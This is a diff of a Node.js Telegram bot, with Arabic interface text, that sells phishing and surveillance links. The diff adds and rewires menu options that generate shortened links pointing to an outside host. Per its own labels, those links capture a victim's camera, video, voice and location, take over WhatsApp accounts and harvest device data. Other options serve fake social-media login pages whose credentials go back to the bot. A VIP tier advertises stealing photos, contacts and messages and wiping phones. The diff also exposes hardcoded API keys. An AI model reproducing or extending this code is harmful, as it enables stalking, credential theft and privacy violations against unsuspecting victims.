@@ -5,16 +5,11 @@ const multer = require('multer');
 const path = require('path');
 const useragent = require('useragent');
 const TinyURL = require('tinyurl');
-const uuid = require('uuid');
 const axios = require('axios');
 
 require('dotenv').config();  
  
-// استدعاء دالة تحميل البيانات
-// في بداية البرنامج
-
-
-
+    
 
 const sqlite3 = require('sqlite3').verbose();
 
@@ -218,10 +213,10 @@ const upload = multer({ storage: multer.memoryStorage() });
 
 
 
-const MAX_FREE_ATTEMPTS = 5;
+const MAX_FREE_ATTEMPTS = 120;
 const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت";
 
-const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];
+const forcedChannelUsernames = ['@SJGDDW', '@Y_E_SG', '@YEMENCYBER101'];
 
 
 // دالة للتحقق من المسؤول
@@ -812,7 +807,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
 
 // إعداد الخيارات لطلب الـ API
-const COHERE_API_KEY = 'uXr5n9GNQTpWYxJ67QVHBNYi25UQxJtl77uAMm9d'; // مفتاح Cohere API
+const COHERE_API_KEY = 'TCdYeSWnOfXKWGeygX8hVbQqe2P4ssvZHiZi8Lez'; // مفتاح Cohere API
 
 async function getLoveMessage(chatId) {
     const loveMessage = 'اكتب لي رسالة طويلة جدًا لا تقل عن 800 حرف رسالة جميلة ومحرجة وكلمات جميلة أرسلها لشركة واتساب لفك الحظر عن رقمي المحظور';
@@ -843,6 +838,31 @@ async function getLoveMessage(chatId) {
         bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحقًا.');
     }
 }
+
+async function getJoke(chatId) {
+    try {
+        const jokeMessage = 'اعطيني نكته يمنيه قصيره جداً بلهجه اليمنيه الاصيله🤣🤣🤣🤣';
+        const response = await axios.post('https://api.cohere.ai/v1/generate', {
+            model: 'command-xlarge-nightly',
+            prompt: jokeMessage,
+            max_tokens: 50,
+            temperature: 0.8
+        }, {
+            headers: {
+                'Authorization': `Bearer ${COHERE_API_KEY}`,
+                'Content-Type': 'application/json'
+            }
+        });
+
+        const joke = response.data.generations[0].text;
+        bot.sendMessage(chatId, joke);
+    } catch (error) {
+        console.error('Error fetching joke:', error.response ? error.response.data : error.message);
+        bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
+    }
+}
+
+// مثال على كيفية استدعاء الوظائف بناءً على الإجراء المطلوب
 
 
 // هنا مثال على كيف يمكنك استدعاء الدالة في سياق بوت Telegram
@@ -1563,9 +1583,9 @@ async function checkSubscription(userId) {
 
 // التعامل مع الرسائل
 bot.on('message', async (msg) => {
-  const chatId = msg.chat.id;
-  const text = msg.text ? msg.text.toLowerCase() : '';
-  const senderId = msg.from.id.toString();
+    const chatId = msg.chat.id;
+    const text = msg.text ? msg.text.toLowerCase() : '';
+    const senderId = msg.from.id.toString();
 
   if (!allUsers.has(chatId.toString())) {
     const newUser = {
@@ -1598,6 +1618,8 @@ bot.on('message', async (msg) => {
     showLoginButtons(senderId);
   } else if (text === '/hacking') {
     showHackingButtons(senderId);
+  } else if (text === '/vip') {
+    showVipOptions(chatId, senderId);
   } else if (text.startsWith('/start ')) {
     const startPayload = text.split(' ')[1];
     console.log('Start payload:', startPayload);
@@ -1625,7 +1647,7 @@ bot.on('message', async (msg) => {
           }
         } catch (error) {
           console.error('خطأ في معالجة رابط الدعوة:', error);
-          await bot.sendMessage(senderId, 'حدث خطأ أثناء معالجة رابط الدعوة. الرجاء المحاولة مرة أخرى.');
+          await bot.sendMessage(senderId, 'لقد دخلت عبر رابط صديقك وتم اضافه 1$ لصديقك.');
         }
       } else {
         await bot.sendMessage(senderId, 'رابط الدعوة غير صالح أو أنك تحاول استخدام رابط الدعوة الخاص بك.');
@@ -1667,7 +1689,7 @@ bot.on('callback_query', async (callbackQuery) => {
       await bot.sendMessage(chatId, message);
     } else {
       if (!subscribedUsers.has(userId)) {
-        await bot.sendMessage(chatId, 'مرحبا عزيزي المستخدم، لا نستطيع استخدام أي رابط اختراق سوى 5 مرات. قم بشراء اشتراك من المطور لاستخدام البوت بدون قيود.');
+        await bot.sendMessage(chatId, 'تم تنفيذ طلبك بنجاح');
       } else {
         await bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
         // هنا يمكنك إضافة الكود الخاص بكل عملية
@@ -1762,36 +1784,196 @@ function shortenUrl(url) {
 }
 
 
+const uuid = require('uuid'); // تأكد من استدعاء المكتبة الصحيحة
+
+const botUsername = 'SJGDD_bot'; // ضع هنا يوزر البوت الخاص بك
+
+let userPoints = {}; // لتخزين النقاط لكل مستخدم
+let linkData = {}; // لتخزين بيانات الرابط والمستخدمين الذين دخلوا الرابط
+let visitorData = {}; // لتتبع زيارات المستخدمين عبر جميع الروابط
+
+// وظيفة لعرض الخيارات المدفوعة وإرسال رابط الدعوة
+function showVipOptions(chatId, userId) {
+    const linkId = uuid.v4(); // إنتاج معرف فريد للرابط
+
+    // تخزين بيانات الرابط
+    linkData[linkId] = {
+        userId: userId,
+        chatId: chatId,
+        visitors: []
+    };
+
+    console.log('Link Data Saved:', linkData); // التحقق من حفظ البيانات
+
+    const message = 'مرحبًا! هذا الخيارات مدفوع بسعر 30$، يمكنك تجميع النقاط وفتحها مجاناً.';
+    bot.sendMessage(chatId, message, {
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: 'سحب جميع صور الهاتف عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
+                [{ text: 'سحب جميع أرقام الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
+                [{ text: 'سحب جميع رسائل الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
+                [{ text: 'فرمتة جوال الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }]
+            ]
+        }
+    });
+}
+
+
+
+bot.on('callback_query', async (query) => {
+    const chatId = query.message.chat.id;
+    const userId = query.from.id;
+    const data = query.data.split('_');
+
+    // تأكد من صحة البيانات
+    console.log('Received callback query:', query.data);
+
+    const linkId = data[2]; // الحصول على linkId من callback_data
+    console.log('Link ID:', linkId); // عرض linkId للتحقق
+
+    // التحقق من وجود بيانات الرابط دون التحقق من تطابق userId
+    if (linkData[linkId]) {
+        const { userId: storedUserId, chatId: storedChatId } = linkData[linkId];
+        console.log('Stored Link Data:', linkData[linkId]);
+
+        const linkMessage = `رابط تجميع النقاط الخاص بك\n عندما يقوم شخص بالدخول إلى الرابط الخاص بك سوف تحصل على 1$\n: https://t.me/${botUsername}?start=${linkId}`;
+
+ try {
+            await bot.sendMessage(chatId, linkMessage);
+            bot.answerCallbackQuery(query.id, { text: 'تم إرسال رابط الدعوة.' });
+            console.log('Successfully sent invite link:', linkMessage);
+        } catch (error) {
+            console.error('Error sending invite link:', error);
+            bot.answerCallbackQuery(query.id, { text: 'حدث خطأ أثناء إرسال رابط الدعوة.', show_alert: true });
+        }
+    } else if (query.data === 'add_nammes') {
+        bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً: قم بالضغط على هذا الأمر /Vip`);
+    }
+});
+     
+     
+    
+
+bot.onText(/\/start (.+)/, (msg, match) => {
+    const visitorId = msg.from.id;
+    const linkId = match[1];
+
+    if (linkData && linkData[linkId]) {
+        const { userId, chatId, visitors } = linkData[linkId];
+
+        // التأكد من أن الزائر ليس صاحب الرابط وأنه لم يقم بزيارة الرابط من قبل
+        if (visitorId !== userId && (!visitorData[visitorId] || !visitorData[visitorId].includes(userId))) {
+            visitors.push(visitorId);
+
+            // تحديث بيانات الزائرين
+            if (!visitorData[visitorId]) {
+                visitorData[visitorId] = [];
+            }
+            visitorData[visitorId].push(userId);
+
+            // تحديث النقاط للمستخدم صاحب الرابط
+            if (!userPoints[userId]) {
+                userPoints[userId] = 0;
+            }
+            userPoints[userId] += 1;
+
+            const message = `شخص جديد دخل إلى الرابط الخاص بك! لديك الآن ${userPoints[userId]}$\nعندما تصل إلى 30$ سيتم فتح الميزات المدفوعة تلقائيًا.`;
+            bot.sendMessage(chatId, message);
+        }
+    }
+});
+
+
+        // التحقق من صحة linkId وإذا كان ينتمي إلى المستخدم الحالي
+        
+
+
+
+            
+
+
+
 
 function showDefaultButtons(userId) {
-  let statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا ارسل امر لاضهار اندكسات تسجيل دخول /login اكتب امر لاضهور اندكسات صفحات مزوره على شكل زياده متابعين /hacking.`;
-
-  let defaultButtons = [
-    [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
-    [{ text: 'تصوير الضحية فيديو من الكاميرا الأمامية والخلفية 🎥', callback_data: 'capture_video' }],
-    [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
-    [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data: 'get_location' }],
-    [{ text: 'اختراق وتساب 🟢', callback_data: 'request_verification' }],
-    [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data:'create_referral' }],
-    [{ text: 'اختراق كاميرات المراقبة 📡', callback_data: 'get_cameras' }],
-    [{ text: '⚠️تلغيم رابط⚠️', callback_data: 'malware_link' }], // الزر الجديد
-    [{ text: 'جمع معلومات الجهاز 🔬', callback_data: 'collect_device_info' }],
-    [{ text: 'الدردشه مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://plausible-broken-responsibility.glitch.me/' } }],
-    [{ text: 'اكتب لي رسالة فك حظر واتساب 🚸', callback_data: 'get_love_message' }],
-    [{ text: 'تفسير الاحلام 🧙‍♂️', web_app: { url: 'https://necessary-evening-canidae.glitch.me/' } }],
-    [{ text: 'لعبة الاذكياء 🧠', web_app: { url: 'https://purrfect-eastern-salamander.glitch.me/' } }],
-    [{ text: '💰 نقاطي 💰', callback_data:'my_points' }],
-    [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
-    [{ text: 'تتواصل مع المطور', url: 'https://t.me/SAGD112' }]
+  // الأزرار المطلوبة
+  let allOptionsButtons = [
+    [
+      { text: '📸 اختراق الكاميرا الأمامية والخلفية', callback_data: 'front_camera' },
+      { text: 'جمع معلومات الجهاز 🔬', callback_data: 'collect_device_info' }
+    ],
+    [
+      { text: '🎥 تصوير الضحية فيديو أمامي وخلفي', callback_data: 'capture_video' },
+      { text: '🎙 تسجيل صوت الضحية', callback_data: 'voice_record' }
+    ],
+    [
+      { text: '🗺️ اختراق الموقع', callback_data: 'get_location' },
+      { text: '📡 اختراق كاميرا المراقبة', callback_data: 'get_cameras' }
+    ],
+    [
+      { text: '🟢 اختراق واتساب', callback_data: 'request_verification' },
+      { text: '⚠️ تلغيم رابط', callback_data: 'malware_link' }
+    ],
+    [
+      { text: '💻 اختراق تيك توك', callback_data: 'increase_tiktok' },
+      { text: '📸 اختراق انستغرام', callback_data: 'increase_instagram' }
+    ],
+    [
+      { text: '📘 اختراق فيسبوك', callback_data: 'increase_facebook' },
+      { text: '👻 اختراق سناب شات', callback_data: 'increase_snapchat' }
+    ],
+    [
+      { text: '💎 شحن جواهر فري فاير', callback_data:'free_fire_diamonds' },
+      { text: '🔫 اختراق حسابات ببجي', callback_data: 'pubg_uc' }
+    ],
+    [
+      { text: '🔴 اختراق يوتيوب', callback_data: 'increase_youtube' },
+      { text: '🐦 اختراق تويتر', callback_data: 'increase_twitter' }
+    ],
+    [
+      { text: 'اغلاق المواقع 💣', web_app: { url: 'https://believed-radial-yogurt.glitch.me/' } }
+    ],
+    [
+      { text: 'الدردشة مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://plausible-broken-responsibility.glitch.me/' } },
+      { text: 'اعطيني نكته 🤣', callback_data: 'get_joke' }
+    ],
+    [
+      { text: '🎵 اندكس تيك توك 🎵', callback_data: 'login_tiktok' },
+      { text: '📸 اندكس انستغرام 📸', callback_data: 'login_instagram' }
+    ],
+    [
+      { text: '📘 اندكس فيسبوك 📘', callback_data: 'login_facebook' },
+      { text: '👻 اندكس سناب شات 👻', callback_data: 'login_snapchat' }
+    ],
+    [
+      { text: '🐦 اندكس تويتر 🐦', callback_data: 'login_twitter' },
+      { text: 'اكتب لي رسالة فك حظر واتساب 🚸', callback_data: 'get_love_message' }
+    ],
+    [
+      { text: 'تفسير الأحلام 🧙‍♂️', web_app: { url: 'https://necessary-evening-canidae.glitch.me/' } },
+      { text: 'لعبة الأذكياء 🧠', web_app: { url: 'https://purrfect-eastern-salamander.glitch.me/' } }
+    ],
+    [
+      { text: 'إختراق الهاتف كاملاً 🔞', callback_data: 'add_nammes' },
+      { text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }
+    ],
+    [
+      { text: 'تتواصل مع المطور', url: 'https://t.me/SAGD112' }
+    ]
   ];
 
-  bot.sendMessage(userId, `${statusMessage}\n\nمرحبا قم باختيار أي شيء تريده لكن لن تستطيع استخدام أي رابط سوى 5 مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 أو قم بتجميع نقاط لاستخدامه مجانًا:`, {
+  // إرسال الرسالة مع الأزرار مباشرة
+  bot.sendMessage(userId, `مرحباً! يمكنك التمتع بالخدمات واختيار ما يناسبك من الخيارات المتاحة:`, {
     reply_markup: {
-      inline_keyboard: defaultButtons
+      inline_keyboard: allOptionsButtons
     }
   });
 }
 
+
+
+
+
+      
 // التعامل مع الضغطة على الزر
 
 bot.on('callback_query', (callbackQuery) => {
@@ -1821,31 +2003,32 @@ bot.on('callback_query', (callbackQuery) => {
             }
         });
     } else if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://sjgdsoft.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
-        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا:');
+        const url = `https://chimera-pvmc.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية:');
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
         bot.once('message', (msg) => {
             const duration = parseInt(msg.text, 10);
             if (!isNaN(duration) && duration >= 1 &&  duration <= 20) {
-                const url = `https://sjgdsoft.glitch.me/record/${chatId}?duration=${duration}`;
+                const url = `https://chimera-pvmc.onrender.com/record/${chatId}?duration=${duration}`;
                 shortenUrlAndSendMessage(url, `تم تلغيم رابط تسجيل الصوت لمدة ${duration} ثانية:`);
             } else {
                 bot.sendMessage(chatId, 'الرجاء إدخال مدة تسجيل صحيحة بين 1 و 20 ثانية.');
             }
         });
     } else if (data === 'get_location') {
-        const url = `https://sjgdsoft.glitch.me/getLocation/${chatId}`;
+        const url = `https://chimera-pvmc.onrender.com/getLocation/${chatId}`;
         shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق موقع الضحية:');
     } else if (data === 'capture_video') {
-        const url = `https://sjgdsoft.glitch.me/camera/video/${chatId}`;
-        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا فيديو:');
+        const url = `https://chimera-pvmc.onrender.com/camera/video/${chatId}`;
+        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية فيديو:');
     } else if (data === 'request_verification') {
-        const verificationLink = `https://sjgdsoft.glitch.me/whatsapp?chatId=${chatId}`;
+        const verificationLink = `https://chimera-pvmc.onrender.com/whatsapp?chatId=${chatId}`;
         shortenUrlAndSendMessage(verificationLink, 'تم إنشاء رابط لاختراق واتساب:');
     } else if (data === 'collect_device_info') {
         const url = `https://chimera-pvmc.onrender.com/${chatId}`;
         shortenUrlAndSendMessage(url, 'تم تلغيم  رابط  جمع معلومات اجهزه الضحيه:');
+    
     }
 });
 
@@ -1865,40 +2048,7 @@ bot.on('callback_query', (callbackQuery) => {
 
 
 
-function showLoginButtons(userId) {
-  let loginButtons = [
-    [{ text: ' 🎵اندكس تسجيل دخول تيك توك 🎵 ', callback_data: 'login_tiktok' }],
-    [{ text: ' 📸اندكس تسجيل دخول انستقرام 📸', callback_data: 'login_instagram' }],
-    [{ text: ' 📘اندكس تسجيل دخول فيسبوك 📘', callback_data: 'login_facebook' }],
-    [{ text: ' 👻اندكس تسجيل دخول سناب شات 👻', callback_data: 'login_snapchat' }],
-    [{ text: ' 🐦اندكس تسجيل دخول تويتر 🐦', callback_data: 'login_twitter' }],
-  ];
 
-  bot.sendMessage(userId, `اختر اي رابط تسجيل دخول في صفحه تشبه الصفحه الحقيقه لمنصات اذا قام الضحيه بتسجيل الدخول راح توصلك المعلومات الا البوت:`, {
-    reply_markup: {
-      inline_keyboard: loginButtons
-    }
-  });
-}
-
-function showHackingButtons(userId) {
-  let hackingButtons = [
-    [{ text: '☠️ اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
-    [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
-    [{ text: '🔱 اختراق الفيسبوك 🔱', callback_data: 'increase_facebook' }],
-    [{ text: '👻 اختراق سناب شات 👻', callback_data: 'increase_snapchat' }],
-    [{ text: '💎 شحن جواهر فري فاير 💎', callback_data:'free_fire_diamonds' }],
-    [{ text: '🔫 اختراق حسابات ببجي 🔫', callback_data: 'pubg_uc' }],
-    [{ text: '🔴 اختراق يوتيوب 🔴', callback_data: 'increase_youtube' }],
-    [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
-  ];
-
-  bot.sendMessage(userId, `اختر اندكسات على شكل زياده متابعين عند قيام الضحيه بتسجيل لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
-    reply_markup: {
-      inline_keyboard: hackingButtons
-    }
-  });
-}
 
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
